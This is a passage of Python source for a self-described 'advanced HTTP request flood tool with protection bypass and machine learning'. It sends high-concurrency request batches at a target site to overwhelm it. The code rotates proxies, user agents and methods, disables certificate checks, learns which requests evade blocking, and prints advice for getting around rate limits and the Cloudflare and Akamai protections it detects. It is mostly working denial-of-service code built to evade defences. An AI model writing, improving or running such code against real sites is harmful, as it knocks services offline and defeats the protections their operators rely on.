                    baseline_times = [r['time'] for r in self.last_responses[:10] if r['time'] > 0]
                    baseline_avg = sum(baseline_times) / len(baseline_times) if baseline_times else avg_time
                    
                    # If response time suddenly increases and is significant
                    if avg_time > baseline_avg * 1.5 and avg_time > self.response_time_threshold and not self.rate_limit_warned:
                        print(f"\n[WARNING] Average response time increased significantly ({baseline_avg:.2f}s → {avg_time:.2f}s). Possible rate limiting.")
                        self.rate_limit_warned = True
                        self.potential_rate_limit = True
                        return True
            
            return False
    
    def get_summary(self) -> Optional[str]:
        """Return a summary of detected patterns."""
        if not self.potential_rate_limit:
            return None
            
        summary = []
        if self.consecutive_failures >= self.consecutive_failures_threshold:
            summary.append(f"- {self.consecutive_failures} consecutive failed requests")
        
        for status_code in [429, 403, 418, 503]:
            if status_code in self.status_counts and self.status_counts[status_code] > 0:
                status_names = {
                    429: "Too Many Requests",
                    403: "Forbidden",
                    418: "I'm a teapot",
                    503: "Service Unavailable"
                }
                status_name = status_names.get(status_code, "")
                summary.append(f"- {self.status_counts[status_code]} '{status_code} {status_name}' responses")
            
        # Add response time analysis
        if len(self.last_responses) >= 10:
            recent_times = [r['time'] for r in self.last_responses[-10:] if r['time'] > 0]
            if recent_times:
                avg_time = sum(recent_times) / len(recent_times)
                baseline_times = [r['time'] for r in self.last_responses[:10] if r['time'] > 0]
                if baseline_times:
                    baseline_avg = sum(baseline_times) / len(baseline_times)
                    if avg_time > baseline_avg * 1.5:
                        summary.append(f"- Response time increased from {baseline_avg:.2f}s to {avg_time:.2f}s")
            
            # Add general patterns
            for code, count in sorted(self.status_counts.items(), key=lambda x: x[1], reverse=True)[:5]:
                if count > 5:  # Only include significant patterns
                    summary.append(f"- Status code {code}: {count} occurrences")
        
        return "\n".join(summary) if summary else None

    def get_recommendations(self) -> str:
        """Get recommendations to bypass rate limiting."""
        if not self.potential_rate_limit:
            return "No rate limiting detected."
            
        recommendations = [
            "Recommendations to bypass rate limiting:",
            "- Decrease concurrency to avoid triggering protection systems",
            "- Add random delays between requests",
            "- Use proxy rotation if available",
            "- Enable the browser emulation mode with cookies and JS support",
            "- Enable adaptive mode to automatically adjust to server responses",
            "- Try request method variation (GET, POST, HEAD)",
            "- Enable header randomization to appear more like legitimate traffic"
        ]
        
        return "\n".join(recommendations)


class RequestStats:
    """Tracks and displays request statistics in real-time."""
    def __init__(self):
        self.success = 0
        self.failed = 0
        self.retries = 0
        self.total_time = 0
        self.start_time = 0
        self.end_time = 0
        self.lock = asyncio.Lock()
        self.last_display_time = 0
        self.display_interval = 0.2  # Update display less frequently to reduce CPU usage
        self.peak_rps = 0  # Track peak requests per second
        self.last_total = 0  # For calculating current RPS
        self.last_rps_time = 0  # For calculating current RPS
        self.status_codes = {}  # Track status code distribution
        self.success_by_method = {}  # Track success by HTTP method
        self.failure_by_method = {}  # Track failures by HTTP method
        
    async def increment_success(self, duration: float, status_code: int, method: str = "GET") -> None:
        """Increment successful request count and update stats."""
        async with self.lock:
            self.success += 1
            self.total_time += duration
            
            # Track status code
            self.status_codes[status_code] = self.status_codes.get(status_code, 0) + 1
            
            # Track by method
            self.success_by_method[method] = self.success_by_method.get(method, 0) + 1
            
            await self._update_display()
    
    async def increment_failed(self, method: str = "GET") -> None:
        """Increment failed request count and update stats."""
        async with self.lock:
            self.failed += 1
            
            # Track by method
            self.failure_by_method[method] = self.failure_by_method.get(method, 0) + 1
            
            await self._update_display()
    
    async def increment_retry(self) -> None:
        """Increment retry count."""
        async with self.lock:
            self.retries += 1
    
    async def _update_display(self) -> None:
        """Update the live counter display if interval has passed."""
        current_time = time.time()
        if current_time - self.last_display_time >= self.display_interval:
            self.last_display_time = current_time
            elapsed = current_time - self.start_time if self.start_time else 0
            total = self.success + self.failed
            
            # Calculate overall RPS
            overall_rps = total / max(0.1, elapsed)
            
            # Calculate current RPS over a short window
            current_rps = 0
            if current_time - self.last_rps_time >= 1.0 and self.last_rps_time > 0:  # 1 second window
                requests_in_window = total - self.last_total
                time_in_window = current_time - self.last_rps_time
                current_rps = requests_in_window / time_in_window
                self.last_total = total
                self.last_rps_time = current_time
            elif self.last_rps_time == 0:
                self.last_rps_time = current_time
                self.last_total = total
            
            # Update peak RPS
            self.peak_rps = max(self.peak_rps, current_rps)
            
            success_rate = (self.success / max(1, total)) * 100
            
            # Clear line and update display
            sys.stdout.write("\r" + " " * 100)  # Clear line
            sys.stdout.write(
                f"\r✅ {self.success} | ❌ {self.failed} | " +
                f"⟲ {self.retries} | Rate: {overall_rps:.1f} r/s | " +
                f"Cur: {current_rps:.1f} r/s | Peak: {self.peak_rps:.1f} r/s | " +
                f"Success: {success_rate:.1f}%"
            )
            sys.stdout.flush()
    
    async def get_stats(self) -> Dict:
        """Get current statistics."""
        async with self.lock:
            total = self.success + self.failed
            avg_time = self.total_time / max(1, self.success) if self.success > 0 else 0
            elapsed = time.time() - self.start_time if self.start_time else 0
            rps = total / max(0.1, elapsed)  # Avoid division by zero
            
            # Get top 5 status codes
            top_status_codes = sorted(
                [(code, count) for code, count in self.status_codes.items()],
                key=lambda x: x[1], reverse=True
            )[:5]
            
            return {
                "success": self.success,
                "failed": self.failed,
                "retries": self.retries,
                "total": total,
                "avg_time": round(avg_time, 4),
                "elapsed": round(elapsed, 2),
                "requests_per_second": round(rps, 2),
                "peak_rps": round(self.peak_rps, 2),
                "top_status_codes": top_status_codes,
                "success_by_method": dict(self.success_by_method),
                "failure_by_method": dict(self.failure_by_method)
            }


class ContentAnalyzer:
    """Analyzes HTTP response content for specified patterns."""
    def __init__(self, patterns=None):
        self.patterns = patterns or []
        # Add default pattern for title
        self.patterns.append((r'<title>(.*?)</title>', "Title: {0}"))
    
    def add_pattern(self, regex: str, template: str) -> None:
        """Add a pattern to search for in responses."""
        self.patterns.append((regex, template))
    
    def analyze(self, content: str) -> str:
        """Analyze content using defined patterns."""
        results = []
        for pattern, template in self.patterns:
            if isinstance(pattern, str) and pattern in content:
                results.append(template)
            else:
                try:
                    match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
                    if match:
                        results.append(template.format(*match.groups()))
                except Exception as e:
                    logger.error(f"Error analyzing with pattern '{pattern}': {str(e)}")
        
        return "\n".join(results) if results else "No matching patterns found"


class FloodController:
    """Controls the request flooding process with advanced features and machine learning."""
    def __init__(self, url: str, stats: RequestStats, analyzer: ContentAnalyzer, 
                 timeout: float = DEFAULT_TIMEOUT, proxies: List[str] = None,
                 user_agent: str = None, show_title_once: bool = True,
                 request_delay: float = 0, rotate_user_agents: bool = False,
                 vary_request_type: bool = False, browser_emulation: bool = False,
                 method_rotation: bool = False, enable_learning: bool = True,
                 learning_persistence_file: str = None):
        self.url = url
        self.stats = stats
        self.analyzer = analyzer
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.semaphore = None  # Will be initialized in flood method
        
        # Parse domain for referer and cookie generation
        parsed_url = urlparse(url)
        self.domain = parsed_url.netloc
        self.base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        self.should_analyze_content = True  # Always analyze content to get title
        self.proxies = proxies or []  # List of proxy URLs
        self.current_proxy_index = 0
        self.proxy_lock = asyncio.Lock()  # Lock for proxy rotation
        self.titles_shown = set()  # Track titles we've already shown
        self.show_title_once = show_title_once  # Option to show title only once
        self.title_displayed = False  # Flag to track if title has been displayed
        self.request_delay = request_delay  # Delay between individual requests
        self.running = True  # Flag to control the flooding process
        self.rotate_user_agents = rotate_user_agents  # Whether to rotate user agents
        self.vary_request_type = vary_request_type  # Whether to vary request types
        self.browser_emulation = browser_emulation  # Whether to emulate real browser behavior
        self.method_rotation = method_rotation  # Whether to rotate HTTP methods
        
        # User agent for fixed mode
        self.user_agent = user_agent or USER_AGENTS[0]
        
        # Add rate limit detector
        self.rate_limit_detector = RateLimitDetector()
        self.pause_on_rate_limit = True  # Whether to pause when rate limiting is detected
        self.adaptive_mode = False  # Whether to adapt request rate based on server response
        
        # Create protection bypass engine
        self.bypass_engine = ProtectionBypassEngine(self.base_url, self.domain)
        
        # Create machine learning system
        self.enable_learning = enable_learning  # Whether to use machine learning
        self.learning_system = RequestLearningSystem(self.base_url, learning_persistence_file)
        
        # Track successful URLs for intelligent targeting
        self.successful_urls = deque(maxlen=50)
        
        # Internal task management
        self._active_tasks = set()
        self._task_lock = asyncio.Lock()
        
        # HTTP methods to rotate through if enabled
        self.http_methods = ["GET", "HEAD"]  # POST will be used occasionally with form data
        self.current_method_index = 0
        self.method_lock = asyncio.Lock()
        
        # SSL context for handling various SSL configurations
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
    
    async def _get_proxy(self) -> Optional[str]:
        """Get a proxy URL from the pool in a thread-safe manner."""
        if not self.proxies:
            return None
            
        async with self.proxy_lock:
            proxy = self.proxies[self.current_proxy_index]
            self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
            return proxy
    
    async def _get_http_method(self) -> str:
        """Get the next HTTP method in rotation or a fixed method."""
        if not self.method_rotation:
            return "GET"
            
        async with self.method_lock:
            method = self.http_methods[self.current_method_index]
            self.current_method_index = (self.current_method_index + 1) % len(self.http_methods)
            
            # Occasionally use POST if we know about a form
            if random.random() < 0.1 and self.bypass_engine.found_forms:
                return "POST"
                
            return method
    
    def _get_user_agent(self) -> str:
        """Get a user agent, either fixed or rotated."""
        if not self.rotate_user_agents:
            return self.user_agent
        return self.bypass_engine.get_random_user_agent()
    
    async def _send_single_request(self, session: aiohttp.ClientSession, req_id: int, retries: int = 0) -> None:
        """Send a single request and extract information."""
        if not self.running:
            return
            
        # Get proxy if available
        proxy = await self._get_proxy()
        
        # Add the delay if configured
        if self.request_delay > 0:
            jitter = random.uniform(-0.1, 0.1) * self.request_delay  # Add +/- 10% jitter
            await asyncio.sleep(max(0, self.request_delay + jitter))
        
        # Get HTTP method - with smart learning if enabled
        if self.enable_learning:
            # Get optimal strategy based on learning
            optimal_strategy = self.learning_system.get_optimal_request_strategy()
            
            # Apply strategy if we have one
            if optimal_strategy:
                if "method" in optimal_strategy:
                    method = optimal_strategy["method"]
                else:
                    method = await self._get_http_method()
                    
                if "delay" in optimal_strategy and optimal_strategy["delay"] > self.request_delay:
                    # Use learned delay if it's longer than configured delay
                    effective_delay = optimal_strategy["delay"]
                    await asyncio.sleep(effective_delay)
            else:
                method = await self._get_http_method()
        else:
            method = await self._get_http_method()
        
        try:
            start = time.time()
            
            # Generate headers - integrate with learning if enabled
            if self.enable_learning and "optimal_strategy" in locals() and "user_agent" in optimal_strategy:
                # Use the learned best user agent
                headers = self.bypass_engine.generate_headers()
                headers["User-Agent"] = optimal_strategy["user_agent"]
            else:
                # Use protection bypass engine to get advanced headers
                headers = self.bypass_engine.generate_headers()
            
            # Generate target URL - sometimes use a variant or learned path
            target_url = self.url
            if self.enable_learning and "optimal_strategy" in locals() and "path" in optimal_strategy:
                # Use a learned successful path
                path = optimal_strategy["path"]
                target_url = f"{self.base_url}{path}"
            elif self.vary_request_type and random.random() < 0.3:
                target_url = self.bypass_engine.get_random_path()
            
            # Get cookies
            cookies = self.bypass_engine.generate_random_cookies() if self.browser_emulation else None
            
            # Create request info for learning
            request_info = {
                "headers": headers,
                "method": method,
                "path": urlparse(target_url).path,
                "delay": self.request_delay
            }
            
            # Check if this request is likely to succeed based on learning
            if self.enable_learning:
                likely_to_succeed, fail_reason = self.learning_system.is_likely_to_succeed(request_info)
                if not likely_to_succeed:
                    logger.debug(f"Request {req_id} adapting due to learning: {fail_reason}")
                    # Try a different approach instead
                    if fail_reason == "user_agent_blocked":
                        # Generate a new user agent
                        headers["User-Agent"] = self.bypass_engine.get_random_user_agent()
                    elif fail_reason == "pattern_blocked":
                        # Try a different path
                        target_url = self.bypass_engine.get_random_path()
                    elif fail_reason == "ip_blocked" and self.proxies:
                        # Force proxy rotation if IP is blocked
                        proxy = await self._get_proxy()
                    elif fail_reason == "insufficient_delay":
                        # Add extra delay to avoid rate limiting
                        optimal_strategy = self.learning_system.get_optimal_request_strategy()
                        if "delay" in optimal_strategy:
                            await asyncio.sleep(optimal_strategy["delay"])
            
            # Sometimes use form submission for POST requests
            form_data = None
            if method == "POST" and self.bypass_engine.found_forms and random.random() < 0.8:
                form_url, form_data = self.bypass_engine.get_random_form_data()
                if form_url and form_data:
                    target_url = form_url
            
            try:
                # Create request kwargs with advanced options
                request_kwargs = {
                    "url": target_url,
                    "allow_redirects": True,
                    "timeout": self.timeout,
                    "ssl": self.ssl_context,
                    "proxy": proxy,
                    "headers": headers,
                    "cookies": cookies,
                    "max_redirects": MAX_REDIRECTS,
                    "trace_request_ctx": {"req_id": req_id, "retries": retries}
                }
                
                # For POST requests with form data
                if method == "POST" and form_data:
                    # Use the appropriate session method
                    response = await session.post(**request_kwargs, data=form_data)
                else:
                    # Use the appropriate session method
                    if method == "GET":
                        response = await session.get(**request_kwargs)
                    elif method == "HEAD":
                        response = await session.head(**request_kwargs)
                    elif method == "POST":  # POST without form data
                        response = await session.post(**request_kwargs)
                    else:  # Fallback to GET
                        response = await session.get(**request_kwargs)
                
                status = response.status
                duration = time.time() - start
                
                # Try to analyze content for successful responses that aren't HEAD requests
                content = None
                if 200 <= status < 300 and method != "HEAD" and self.should_analyze_content:
                    try:
                        content = await response.text(errors='replace')
                        
                        # Update bypass engine with response info
                        self.bypass_engine.update_from_response(response, content)
                        
                        # Look for title
                        title_match = re.search(r'<title>(.*?)</title>', content, re.IGNORECASE | re.DOTALL)
                        if title_match and title_match.group(1):
                            title = title_match.group(1).strip()
                            
                            # If show_title_once is True, only display the title once
                            if self.show_title_once:
                                if not self.title_displayed:
                                    print(f"\n[SUCCESS] Website Title: {title}")
                                    print(f"[SUCCESS] Request completed successfully with status {status}")
                                    print("[SUCCESS] Connection to target confirmed. Continuing with flood...")
                                    sys.stdout.flush()
                                    self.title_displayed = True
                            # Otherwise display new titles as they're found
                            elif title and title not in self.titles_shown:
                                self.titles_shown.add(title)
                                print(f"\n[SUCCESS] Website Title: {title}")
                                sys.stdout.flush()
                    except Exception as e:
                        logger.debug(f"Failed to extract title: {str(e)}")
                else:
                    # Even without content, update bypass engine with response info
                    self.bypass_engine.update_from_response(response)
                
                # Check for rate limiting - pass headers and content if available
                is_rate_limited = await self.rate_limit_detector.analyze_response(
                    status, duration, dict(response.headers), content
                )
                
                if is_rate_limited and self.pause_on_rate_limit:
                    print("\n[ACTION] Pausing requests for 5 seconds to avoid triggering more rate limits...")
                    await asyncio.sleep(5)
                    if self.adaptive_mode:
                        new_delay = self.request_delay + 0.1  # Increase delay by 100ms
                        self.request_delay = min(1.0, new_delay)  # Cap at 1 second
                        print(f"Adapting request delay to {self.request_delay:.2f}s")
                    print("Resuming with reduced request rate...")
                
                # Track if this was successful, and which URL worked
                if 200 <= status < 300:
                    self.successful_urls.append(str(response.url))
                    
                    # Add successful request to learning system
                    if self.enable_learning:
                        request_info["url"] = str(response.url)
                        self.learning_system.record_success(request_info)
                
                # Increment success stats
                await self.stats.increment_success(duration, status, method)
                
            except aiohttp.ClientResponseError as e:
                if retries < MAX_RETRIES:
                    await self.stats.increment_retry()
                    return await self._send_single_request(session, req_id, retries + 1)
                
                logger.debug(f"Request {req_id} failed with response error: {str(e)}")
                # Record failure in learning system
                if self.enable_learning:
                    failure_type = "rate_limited" if (hasattr(e, 'status') and e.status == 429) else "blocked"
                    self.learning_system.record_failure(request_info, failure_type)
                
                # Mark in rate limit detection too
                await self.rate_limit_detector.analyze_response(e.status if hasattr(e, 'status') else 0, time.time() - start)
                await self.stats.increment_failed(method)
                
            except asyncio.TimeoutError:
                if retries < MAX_RETRIES:
                    await self.stats.increment_retry()
                    return await self._send_single_request(session, req_id, retries + 1)
                
                logger.debug(f"Request {req_id} timed out")
                
                # Record timeout failure in learning system
                if self.enable_learning:
                    self.learning_system.record_failure(request_info, "timeout")
                
                # Mark timeouts for rate limit detection too
                await self.rate_limit_detector.analyze_response(0, self.timeout.total)
                await self.stats.increment_failed(method)
                
            except aiohttp.ClientError as e:
                if retries < MAX_RETRIES:
                    await self.stats.increment_retry()
                    return await self._send_single_request(session, req_id, retries + 1)
                
                logger.debug(f"Request {req_id} failed with client error: {str(e)}")
                
                # Record client error in learning system
                if self.enable_learning:
                    self.learning_system.record_failure(request_info, "client_error")
                
                await self.stats.increment_failed(method)
                
            except Exception as e:
                if retries < MAX_RETRIES:
                    await self.stats.increment_retry()
                    return await self._send_single_request(session, req_id, retries + 1)
                
                logger.debug(f"Request {req_id} failed with error: {str(e)}")
                
                # Record generic error in learning system
                if self.enable_learning:
                    self.learning_system.record_failure(request_info, "error")
                
                await self.stats.increment_failed(method)
                
        except Exception as e:
            logger.error(f"Unexpected outer error in request {req_id}: {str(e)}")
            await self.stats.increment_failed()
    
    async def _run_batch(self, session: aiohttp.ClientSession, batch_size: int, start_id: int) -> None:
        """Run a batch of requests with optimized performance."""
        if not self.running:
            return
            
        tasks = []
        
        # Create all tasks upfront
        for i in range(batch_size):
            req_id = start_id + i
            
            task = asyncio.create_task(self._controlled_request(session, req_id))
            
            # Track the task
            async with self._task_lock:
                self._active_tasks.add(task)
                task.add_done_callback(lambda t: asyncio.create_task(self._remove_task(t)))
                
            tasks.append(task)
        
        # Wait for all tasks to complete
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception as e:
            logger.error(f"Batch error: {str(e)}")
    
    async def _remove_task(self, task):
        """Remove a task from the active tasks set."""
        async with self._task_lock:
            self._active_tasks.discard(task)
    
    async def _controlled_request(self, session: aiohttp.ClientSession, req_id: int) -> None:
        """Execute a request with concurrency control."""
        if not self.running:
            return
            
        try:
            async with self.semaphore:
                await self._send_single_request(session, req_id)
        except asyncio.CancelledError:
            await self.stats.increment_failed()
        except Exception as e:
            logger.error(f"Task error: {str(e)}")
            await self.stats.increment_failed()
    
    async def stop(self):
        """Stop the flooding process and clean up."""
        self.running = False
        
        # Cancel all active tasks
        async with self._task_lock:
            for task in self._active_tasks:
                task.cancel()
            
            # Wait a moment for tasks to cancel
            await asyncio.sleep(0.5)
        
        # Save learning data if enabled
        if self.enable_learning:
            try:
                self.learning_system.save_learning()
                logger.info("Saved machine learning data")
            except Exception as e:
                logger.error(f"Failed to save learning data: {str(e)}")
    
    async def flood(self, total_requests: int, concurrency: int, batch_size: int = 100) -> None:
        """Execute the flooding with maximized speed and enhanced performance."""
        # Set up signal handlers
        self._setup_signal_handlers()
        
        # Initialize semaphore for concurrency control
        self.semaphore = asyncio.Semaphore(concurrency)
        self.stats.start_time = time.time()
        self.running = True
        
        # Print header for live stats
        print("\n" + "="*75)
        print("⚡ ADVANCED HTTP REQUEST FLOOD TOOL WITH PROTECTION BYPASS AND MACHINE LEARNING ⚡")
        print("Improved version with enhanced reliability, protection bypass and learning capabilities")
        print("="*75)
        
        print("\n--- LIVE REQUEST STATISTICS ---")
        print(f"Target URL: {self.url}")
        print(f"Starting flood with {concurrency} concurrent connections")
        print(f"Processing in batches of {batch_size}")
        print(f"Proxies: {'Enabled (' + str(len(self.proxies)) + ' proxies)' if self.proxies else 'Disabled'}")
        print(f"Request delay: {self.request_delay}s per request")
        print(f"Browser emulation: {'Enabled' if self.browser_emulation else 'Disabled'}")
        print(f"User agent rotation: {'Enabled' if self.rotate_user_agents else 'Disabled'}")
        print(f"Method rotation: {'Enabled' if self.method_rotation else 'Disabled'}")
        print(f"URL variation: {'Enabled' if self.vary_request_type else 'Disabled'}")
        print(f"Rate limit detection: Enabled")
        print(f"Pause on rate limit: {'Enabled' if self.pause_on_rate_limit else 'Disabled'}")
        print(f"Adaptive mode: {'Enabled' if self.adaptive_mode else 'Disabled'}")
        print(f"Machine learning: {'Enabled' if self.enable_learning else 'Disabled'}")
        print("Website titles will be displayed when successful connections are made")
        print("Press Ctrl+C to stop\n")
        
        # Do a single test request first to verify the URL is reachable
        print(f"Performing test request to {self.url}...")
        
        # Create an initial connector for the test
        conn = None
        request_successful = False
        error_message = None
        server_info = {}
        
        try:
            # Create a connector for the test request
            conn = aiohttp.TCPConnector(
                ssl=False,  # Skip SSL verification for speed
                force_close=False,
                limit=5  # Low connection limit for test
            )
            
            # Prepare headers for test request
            test_headers = {
                "User-Agent": self._get_user_agent(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive"
            }
            
            # Try the test request with a reasonable timeout
            try:
                # Create a session with proper error handling
                async with aiohttp.ClientSession(
                    connector=conn,
                    timeout=aiohttp.ClientTimeout(total=20),  # Longer timeout for initial test
                    raise_for_status=False
                ) as test_session:
                    
                    async with test_session.get(
                        self.url, 
                        ssl=self.ssl_context, 
                        headers=test_headers,
                        timeout=aiohttp.ClientTimeout(total=20)
                    ) as response:
                        status = response.status
                        print(f"Test request result: Status {status}")
                        
                        # Check response headers for server info
                        server_headers = ['server', 'x-powered-by', 'x-server', 'powered-by']
                        for header in server_headers:
                            if header in response.headers:
                                server_info[header] = response.headers[header]
                                print(f"[INFO] {header.title()}: {response.headers[header]}")
                        
                        # Check for protection systems
                        protection_headers = ['cf-ray', 'x-cache', 'x-cdn', 'x-akamai-transformed', 
                                              'x-amz-cf-id', 'x-edge-location', 'x-cache-hits']
                        for header in protection_headers:
                            if header in response.headers:
                                server_info[header] = response.headers[header]
                                print(f"[INFO] Protection header found: {header}: {response.headers[header]}")
                                
                        # Check for rate limiting headers
                        rate_limit_headers = ['retry-after', 'x-ratelimit-limit', 'x-ratelimit-remaining', 
                                             'ratelimit-limit', 'ratelimit-remaining', 'x-rate-limit-limit']
                        for header in rate_limit_headers:
                            if header in response.headers:
                                server_info[header] = response.headers[header]
                                print(f"[WARNING] Rate limit header found: {header}: {response.headers[header]}")
                        
                        # Check for various status codes
                        if 200 <= status < 300:
                            print("[SUCCESS] Server is responding normally.")
                            request_successful = True
                        elif status >= 400:
                            print(f"[WARNING] Server returned error status {status}.")
                            if status == 403:
                                print("[WARNING] 403 Forbidden - Server may be blocking requests or requires authentication.")
                            elif status == 404:
                                print("[WARNING] 404 Not Found - Check if the URL is correct.")
                            elif status == 429:
                                print("[WARNING] 429 Too Many Requests - Server has rate limiting.")
                            elif status == 500:
                                print("[WARNING] 500 Internal Server Error - Server is experiencing issues.")
                            elif status == 503:
                                print("[WARNING] 503 Service Unavailable - Server may be overloaded or under maintenance.")
                        
                        # Try to get the title
                        try:
                            content = await response.text(errors='replace')
                            
                            # Update bypass engine with initial response
                            self.bypass_engine.update_from_response(response, content)
                            
                            # Check content for protection systems
                            protection_patterns = [
                                (r'cloudflare', "Cloudflare"),
                                (r'akamai', "Akamai"),
                                (r'incapsula', "Imperva/Incapsula"),
                                (r'fastly', "Fastly"),
                                (r'sucuri', "Sucuri"),
                                (r'distil', "Distil Networks"),
                                (r'captcha', "CAPTCHA-based protection"),
                                (r'challenge', "JavaScript challenge protection"),
                                (r'waf', "Web Application Firewall")
                            ]
                            
                            for pattern, name in protection_patterns:
                                if re.search(pattern, content, re.IGNORECASE):
                                    print(f"[WARNING] Detected {name} protection system in response content.")
                            
                            # Look for title
                            title_match = re.search(r'<title>(.*?)</title>', content, re.IGNORECASE | re.DOTALL)
                            if title_match and title_match.group(1):
                                title = title_match.group(1).strip()
                                print(f"[INFO] Website title: {title}")
                                request_successful = True
                                
                            # Look for forms
                            form_count = len(re.findall(r'<form', content, re.IGNORECASE))
                            if form_count > 0:
                                print(f"[INFO] Found {form_count} form(s) in the response")
                                
                            # Record the initial test in the learning system if enabled
                            if self.enable_learning and request_successful:
                                request_info = {
                                    "headers": test_headers,
                                    "method": "GET",
                                    "path": urlparse(self.url).path,
                                    "delay": 0,
                                    "url": str(response.url)
                                }
                                self.learning_system.record_success(request_info)
                                
                        except Exception as e:
                            print(f"[WARNING] Could not extract content/title: {str(e)}")
                            
            except aiohttp.ClientSSLError as e:
                error_message = f"SSL error: {str(e)}"
                print(f"[ERROR] {error_message}")
                print("[ERROR] SSL certificate verification failed. Using SSL=False to bypass.")
            
            except aiohttp.ClientResponseError as e:
                error_message = f"Response error: {str(e)}"
                print(f"[ERROR] {error_message}")
                
            except asyncio.TimeoutError:
                error_message = "Request timed out"
                print(f"[ERROR] {error_message}")
                print("[ERROR] The server did not respond in time.")
                
            except Exception as e:
                error_message = f"Unexpected error: {str(e)}"
                print(f"[ERROR] {error_message}")
                print(f"[ERROR] Error details: {traceback.format_exc()}")
                
        except Exception as e:
            error_message = f"Test connection error: {str(e)}"
            print(f"[ERROR] {error_message}")
            
        # If test failed, ask user if they want to continue
        if not request_successful:
            print("\n[WARNING] Test request was not fully successful.")
            if error_message:
                print(f"[ERROR] {error_message}")
                print("Do you want to continue anyway? (y/n)")
                user_choice = input().lower()
                if user_choice != 'y':
                    print("Aborting operation.")
                    return
                print("Continuing despite test failure. Results may not be reliable.")
        
            # Close test connector if it exists
        if conn:
                await conn.close()
        
        # Determine optimal connector settings based on OS
        limit_connections = DEFAULT_CONNECTIONS
        if platform.system() == "Windows":
            # Windows has lower limits
            limit_connections = min(500, concurrency * 2)
        else:
            # Linux/Mac can handle more
            limit_connections = min(2000, concurrency * 4)
        
        # Provide protection bypass suggestions based on test results
        if server_info:
            print("\n--- PROTECTION ANALYSIS ---")
            if any(k for k in server_info if 'cf-' in k.lower() or 'cloudflare' in k.lower()):
                print("[INFO] Cloudflare protection detected. Using appropriate bypass techniques.")
                print("[TIP] Consider enabling Browser Emulation mode and adding request delays.")
            elif any(k for k in server_info if 'akamai' in k.lower()):
                print("[INFO] Akamai protection detected. Using appropriate bypass techniques.")
                print("[TIP] Consider using proxies and reducing concurrency.")
            elif any(k for k in server_info if 'rate' in k.lower() or 'limit' in k.lower()):
                print("[INFO] Rate limiting detected. Adjusting request patterns.")
                print("[TIP] Consider increasing request delay and reducing concurrency.")
        
        # Create an optimized connector for the flood
        conn = aiohttp.TCPConnector(
            limit=limit_connections,
            limit_per_host=DEFAULT_LIMIT_PER_HOST,
            ttl_dns_cache=300,
            ssl=False,  # Skip SSL verification for speed
            force_close=False,  # Keep connections open for performance
            enable_cleanup_closed=True  # Still enable cleanup for stability
        )
        
        # Create an asynchronous task that updates stat display periodically
        async def update_display():
            try:
                while self.running:
                    await asyncio.sleep(0.1)  # Update 10 times per second
                    stats = await self.stats.get_stats()
                    if stats["total"] >= total_requests:
                        break
            except asyncio.CancelledError:
                pass
            except Exception as e:
                logger.error(f"Display update error: {str(e)}")
        
        # Start the display update task
        display_task = asyncio.create_task(update_display())
        
        # Main flood execution
        try:
            # Create a client session with optimized settings
            session_timeout = aiohttp.ClientTimeout(
                total=None,  # No total timeout for the session
                sock_connect=self.timeout.total,  # Socket connection timeout
                sock_read=self.timeout.total     # Socket read timeout
            )
            
            # Create session with properly validated parameters
            async with aiohttp.ClientSession(
                connector=conn,
                timeout=session_timeout,
                raise_for_status=False,
                trust_env=False
            ) as session:
                batches = (total_requests + batch_size - 1) // batch_size
                
                try:
                    for batch in range(batches):
                        if not self.running:
                            break
                            
                        start_id = batch * batch_size + 1
                        current_batch_size = min(batch_size, total_requests - (batch * batch_size))
                        
                        if current_batch_size <= 0:
                            break
                        
                        # Print batch progress every 10 batches
                        if batch % 10 == 0:
                            logger.debug(f"Starting batch {batch+1}/{batches}...")
                            
                            # Display machine learning stats periodically if enabled
                            if self.enable_learning and batch > 0:
                                learning_stats = self.learning_system.get_learning_stats()
                                success_rate = learning_stats["success_rate"]
                                print(f"\n[LEARNING] Success rate: {success_rate:.2f}% " +
                                     f"({learning_stats['successful_requests']}/{learning_stats['total_requests']} requests)")
                                if "best_strategies" in learning_stats and learning_stats["best_strategies"]:
                                    strategies = learning_stats["best_strategies"]
                                    strategy_info = []
                                    if "method" in strategies:
                                        strategy_info.append(f"Method: {strategies['method']}")
                                    if "delay" in strategies:
                                        strategy_info.append(f"Delay: {strategies['delay']:.2f}s")
                                    if strategy_info:
                                        print(f"[LEARNING] Best strategy: {', '.join(strategy_info)}")
                                if learning_stats["blocked_user_agents"] > 0:
                                    print(f"[LEARNING] Blocked user agents: {learning_stats['blocked_user_agents']}")
                                if learning_stats["rate_limited"]:
                                    print("[LEARNING] Rate limiting detected, using more conservative approach")
                        
                        await self._run_batch(session, current_batch_size, start_id)
                        
                        # Small delay between batches for stability
                        await asyncio.sleep(REQUEST_INTERVAL)
                        
                        # Save learning data periodically
                        if self.enable_learning and batch % 5 == 0:
                            self.learning_system.save_learning()
                    
                except KeyboardInterrupt:
                    print("\nOperation interrupted by user. Cleaning up...")
                    self.running = False
                except Exception as e:
                    print(f"\nEncountered error during flood: {str(e)}")
                finally:
                    # Make sure to clean up display task
                    display_task.cancel()
                    
                    try:
                        # Give some time for tasks to clean up
                        await asyncio.sleep(0.5)
                    except asyncio.CancelledError:
                        pass
                    except Exception as e:
                        print(f"\nCritical error in flood operation: {str(e)}")
        finally:
            # Final cleanup
            self.running = False
            try:
                await self.stop()  # Ensure all tasks are cancelled
            except Exception:
                pass
        
            self.stats.end_time = time.time()
            final_stats = await self.stats.get_stats()
        
        # Show final results
        print("\n\n" + "="*75)
        print(f"Flood completed in {final_stats['elapsed']}s")
        print(f"Successful requests: {final_stats['success']}")
        print(f"Failed requests: {final_stats['failed']}")
        print(f"Retried requests: {final_stats['retries']}")
        print(f"Average response time: {final_stats['avg_time']}s")
        print(f"Effective requests per second: {final_stats['requests_per_second']}")
        print(f"Peak requests per second: {final_stats['peak_rps']}")
        
        # Show success by method if method rotation was enabled
        if self.method_rotation:
            print("\nSuccess by HTTP Method:")
            for method, count in final_stats['success_by_method'].items():
                print(f"  - {method}: {count} successful requests")
        
        # Show top status codes
        if final_stats['top_status_codes']:
            print("\nTop Status Codes:")
